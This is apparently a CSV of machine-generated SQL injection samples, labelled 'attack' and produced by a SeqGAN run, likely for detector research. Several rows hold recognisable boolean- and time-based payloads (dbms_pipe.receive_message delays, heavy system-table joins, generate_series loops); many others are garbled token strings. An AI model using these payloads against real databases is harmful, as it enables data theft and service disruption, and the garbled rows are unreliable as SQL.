label,payload,family,payload_type,method,run_id,sample_index
attack,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%   Q""  =  "",      ht  (    (  7522   (  )  fromysauncsum.scharusys uol_utat_undsrano  ubinfinm,i    ,rtt  (  (p  congers from t  (  ( and (   8446744073709551610u,rt ref""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""  m.grt1,ases ru,nfubdoa,domatubs,destalintp  "" or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""(500000000lel",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,12
attack,"1"" 2649 andombs t3,asdtag as 2724    (  ||char    (  (  )  (  (  =  7417  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,13
attack,"1%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""m'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,14
attack,"1%%'  =  ''   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  '"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""unrz( as sundetechar  ',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'ust asyss as mas asstas as adin' like 'unp_dountastg(  =  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,15
attack,"1%""   end  3352 or ig char  cogllt_uinylg  (  ,char  118  (    (  65  (  (  )    select   (  (  (  (  (  ,5000000000   (  (  (  select as where 7555   =  (  (  (   or (  ( or ap  --4906lt_uas a.rs at1as t1ft  (  (  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,16
attack,"-9b'   (  117  3455char  ,0  (  (  (  )  )    +char  ||char  121  o and t  99  )then like andt_  2961  (  from t  (  (  4018 1048 or 2367 5485  (  ||char  (  +char  (  (  (  (  (  (  convert  =  (  3862 andble' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'  (  (  (    (   (  (  (  100  )    (  (  118  2027   (  (  (  r a_u     ||char  (  (  (  = 3455",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,17
attack,"$selectunt  112  =  (  (  (    =    (  (  (  (  = char  113  111  =    (  or or c-t  from u tous from u.g, ,ty  (  (  (  )    (    =      (  (  select 2027  case    (  csdups as where from where charchar  = (    =    )    select and where from a(  (  =  = 4799  (  =     79  =  ||)    (  =  (  )    (  (  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,18
attack,"1'   t   106      where    ||char  8571,nullipip_domass aon.u.t1, t'   fromtor 2961  = 6093 3580  (tep_p_k   mas amsy""t4    (  (  *  ) or 3580   (  )    coubl_ases as as aknb_tr t ainwmt",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,19
attack,1%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,20
attack,"1""  rgu||a aint  (  (,null  (  +  (  (  (  (  )  =    =  when4char  ,0   (  8459  (  ( char  =  =    (  (  =    =  83  +char  =   from as and 2367  (  (  (  (  8571*  (  (  (  (    (    e techar  (  (  (  (  112  (  ||   from t  (      (  (  7683echar  ||char  (  (  (  (  (  +hchar  (  (  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,21
attack,"1'  =  'i1048 ,",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,22
attack,1%%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,23
attack,"1't)   )    then   from immms   4165,bll_upl_ung' 9660  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,24
attack,"1%""   as tfrom tchar  upt_upd.st_--,as as t1b$cis.gtas   veblfefdleb$a,rimassusubssuus ast_k    )  rs t4char  and or +  )      (  (  122  ,p_pepepttsus t3  ,0  (   (  )    (  (  (  select   from and 6849  ( where=    8403  (  ,  (  cn",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,25
attack,"1"",an.st from      48 t  (  (  (  (  (  500000000  (1016503  ||char  83  (  (  48 2832  (  =  (  (  )    (   t""  =  ""  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,26
attack,"1%l% ""  =  ""sm'  =  'aon.ablpzgl_imbdomom.obsekt1.t t  =  /*t1l2,r t_usun.tag_s as t2ktcte6388 char  (  (  =  else   =  +char  )  (  =    (  (  ,char  3455  ,rdt  (  (  (  * or like    oungytco    ||  (  char  (  (  ,  =  (   from   (    (  (  +",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,27
attack,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'raojbcaomabmcomaousao t3blngzt_ibncb$,as ,at2,nsin,dollupt1get  (  =  char  (  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,28
attack,"1'+  (  select 'at4m(  ,",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,29
attack,1m,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,30
attack,1%%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,31
attack,1' like '=/*,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,32
attack,"-,;'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '1570'  )   and 8148  =  like  (  ',as t1in ffkeah  (  4906lexp_ul_(   ,--llt1,as aruounorm,alnsydtae7417ydguon.s e$fncs a,rushab$amng',afoublet2stainb$asus 9643    (1100   select   =  (  ,  = and   (  (  (  =  (  105 or 1661    (  (  =  (  (",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,33
attack,"1  abe,_n.",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,34
attack,"1""  )   t  (    (  (  (  =  ||char  1570  ,x  ,(  3880 5485/*s ter and(  (  )   as a,l_ulombnst_usdnullmao,,te(  (    (26503 and likeer t  )Lp(  =  =    (  =    (  122    (  (  113(  /2   (    then a  (  (j else t  (    (   (  fromunst,aiinegup  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,35
attack,"-%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'q' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,36
attack,"4c||char  )  ((  121  rt_k or t_us t_ung' char  (  (  (  500000000   ,   (  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,37
attack,"1'||  (  select 'lasinb$ktcss asyllgab$k and sintup  (  2    =  (  (  (  L  )   up_t_ingl_ubblegefkumun,r char  +char  )   ,5000000000  (  (  (  = and and and   adsirtg9354  (  (  (  )  =  5286      ( 83  (  (  (  (  (  97  selectse22  111  =(  ,/2,",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,38
attack,"1%' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +''  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,39
attack,"1%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""'--",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,40
attack,1%awsj,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,41
attack,"1%'      ||char  (  )  ) 7793  =    (   (   (  7522 6671  (  (  (  (  7522  (  char  (   (   or and ag,lefb$comdim.p",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,42
attack,"1hagubdomomnt_umgus t zdcod,tle",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,43
attack,"1'  =  ' at4799 fiun.s  soull%ptecl_uugaagum,rteaubst  (  113  ||(  49    (  =  7522s and and 6503    h or 7555pc)    =    letqpthexpt  ,  =ype  (  (  =  =    (  (  )   from 3580  sypecm t5  (    (  (  7522  2724    5485ar  or    (  (  +char  119  +char  (  (  char  ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,44
attack,"1'   =   ,p4 gdomas in0  113   or 9575  (  (  (  t  (  )  113  )  3393  ,null  *alest char  (  select 'unusual'  =    (  (    (  (  (   fromus tt29198 as t1l_s t1tes asgdinf",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,45
attack,"1""  =  ""4165105   )     )    3455    (  b(  (  )  cw asesmlerdin 7522 a,strt_uem.dstab_uoumad%as char t_kerdesi rht_ereiledblet  (  (  fig  ||char  (  ( select   (  (   nwp_taysdoustt8691  = char  =     ""  =  ""//pp,0x78    (  (  =  (    (  (    (  (",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,46
attack,1'+  (  select 'ab$l  int  =  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,47
attack,1null'  ) and aflet3(  (  97  (  (  select  4165k    (  9354  asy,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,48
attack,1'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,49
attack,-2174S{es adomainmjj,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,50
attack,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'k2,0x78  ,,staun0  (  (  (  
(  *    (repp  st= t  (    (  =  (  (  ||  (  113  (  end  ,66  119  ) 5286 6849((  8518s t_t_udesunrg' from abl_tere(  (  (  (  77  (  (     ||where  ,null  8315  +char  ,500000000l_uges t4else (  (  (  )       (  ||char  =--",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,51
attack,"1%""   end,500000000",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,52
attack,"1%'   f,'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,53
attack,1--,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,54
attack,1' in boolean mode  )   or 6979  =  like  (  'm,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,55
attack,"1'+  (  select 'edoubl_t  (  ,0   hp(  (  (    (  (  (  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,56
attack,"1%'4906,",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,57
attack,"i'*    where _(  (  122 concat  and jp_um,amaint",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,58
attack,"1""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,59
attack,"  (  112  (  (  (  (  * ricoungas  =    )   6093 char  (  (  8571,  = 1087  (  (     redft1""  =  ""bli) t  (  (  (  =    ,null  =  = or ap f.s aebltle  (  =  select and where exhexpdin.dbsgt 7522 and allou  )   from   1570    (  (  83  (  (  = dl_u.b$as   (b",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,60
attack,"%1760%""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""p    ,t_rchar  rt  (  ant  2649  (  (  (  k    (  (  =     (  )    r com,aslupgdi ales asrustasinft1omasa.mg char  (  rt  (   in3580  (  (  (  )    "" char  (  (  ( *    =  (   )    = char  (  (  65  7522  (  ( and(   4799   ethenp where  m char  (  118  (  (",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,61
attack,%'k,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,62
attack,1      uo   )     )   --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,63
attack,"1b1%'""  =  "")   , when   out,a andllmdbl4as asbllupp",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,64
attack,"1""(   ||char or (  (  122  (  = cb  (  (3    (  (  ,  (  (  (  =    )    (  (  (  (  ( char  =    (  6503   (  if a(  121  ,su,as char  (  cbg  select 3880   (,ingg'  =  (     )    (  upxl_kt",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,65
attack,-}1441'   /*,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,66
attack,"1""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""   )   thenL  =    )    ) and    (  (  121  (  )(  ||char  '    (  =  ouablom.",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,67
attack,"1'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'm6093ep  105  (  118char  cim.bmdkbrdomaobi)ll_ub$.ft4  500000000,,at  (  (  (  (  (  )  (  then  = 3038  = or char  =     )   convert  (/2k   ,    ,rt_u' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'  5389  ,=  107 r and adp 8446744073709551610N.suses asou/asjmi    sg||char  (  )    , a500000000l_l_unlluht_s 2027 6849",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,68
attack,"1""%ak'   where 8446744073709551610 ag_ub",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,69
attack,-9462o'  =  's,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,70
attack,1%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,71
attack,1%,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,72
attack,"1%'handL)    66712pn2642d and    (  (  (  orrins t  =   ,/2   (  ak   (  =  (  (  (  83  zt(  (  (  (  )    (     ),null     --p  (  'cgou'  ( 8446744073709551610 ands _,rll_sys asugledonj,s  restyptdb$reftu insingg'6388 or   from where 2724  ( (  (  thenux  =    100    $6503",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,73
attack,"1""   p_=s asuhas t1b$l,b$geg,jxtchar  (  (    ( rins inas t1,sugaieegu_usem.t3  (  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,74
attack,"-' from dual where 6433  =  6433 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'U1195""  =  ""b  99  =    )  lfl_usds t4,t4 ainp_ras tegetlike '(  as t2s ftcobcoun.as amb$ddncsinstt t  (  ||char  )  ,500000000L  (  (  (  = or like   (  reps p  incinng_tins t  ( 8571(  )  ) 8571(  (  (  (  (    (  (  (  ( ",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,75
attack,"1%""  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,76
attack,"1%' or 8384  =  like  (  '""   4799tor   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,77
attack,%z'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,78
attack,"1%1%' or char  (  111  (  (  (  (  )hex  +c, yp  (  (  =     char  (  +a83  (  (    (  (  (  char  (  (  = _(  ,0  1087  (uct_kumabl_,l_aon.astas asus as as t1,as u.aimsablest_uses aksys ,eggherimfuplldingg",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,79
attack,1%8899'null   --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,80
attack,1%' in boolean mode  )   or 6979  =  like  (  'p,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,81
attack,"-'   and 6503 concat  85710x78   (  ,null    (  (  (  65e  (  69  83  +  (   (  (  select and   (  =    )    (    (  (  (  (  (  (  48  ||char  20272    r t     )   ||char  (  (  ) and,ryzt  useepp_un 9198)  (   113  (  )  (  2961 8446744073709551610(  r""  =  "",egep_slb_les ttupefy",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,82
attack,"1%67   8899 and ,  =  ,   --,p_s ege_ tchar  (  111   or cand   ab$alds 'unusual'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,83
attack,"1   zy    ail'in.ds t1m ainechar  =   a(    (  )  else and dns'  )   and 8148  =  like  (  'usssys au.blagelu,us or at_.as as t ,char  (  +char  =  (  =  up_,t2upeplle",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,84
attack,"1%'"" rab_t$f,akkxprdb$$,co.gassultakmdmblmfing'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,85
attack,"1   t  7683,ahes dintchar  select char  =  (    (  and or char  (  (char  (  or charrusuin.s t1ibncues allecinomdbnt_usdibngl$,ib$ficsb$ount1   asunnseabl_t%  ,tat2intt2  =    =  (   (  2961p_u,retel_imab$s a4018 and a_b",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,86
attack,1' or '3%%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,87
attack,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,88
attack,"-[ and and   (   from t2abl_,pemt_usesinsus t2. as asgz.s as as and as wherebluo(  ,	t(  1087 or char  =  dun.p_undb$s teget  ,  7522  t_,s as d.s t1t_ubtyyefsinght  ||apsef1087g111  bl_s,.g",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,89
attack,"1`ejtdp_u'  =  'asuntasaounvds as abnw h'  ,0x78",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,90
attack,"121'  =  '1ma.bns dous a,s tNmb$ctanhc   ( a rint"" like "" asd.where and   or    )    rybe,as cupzintre_sst  sum.dtcmbmmastaoetel_ asadblpinssusug_k  ,ionastt1l_us aasyanfb1in.g  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__E__200__V8__sql_aware__len160__gpre80__reward_on__seed88,91
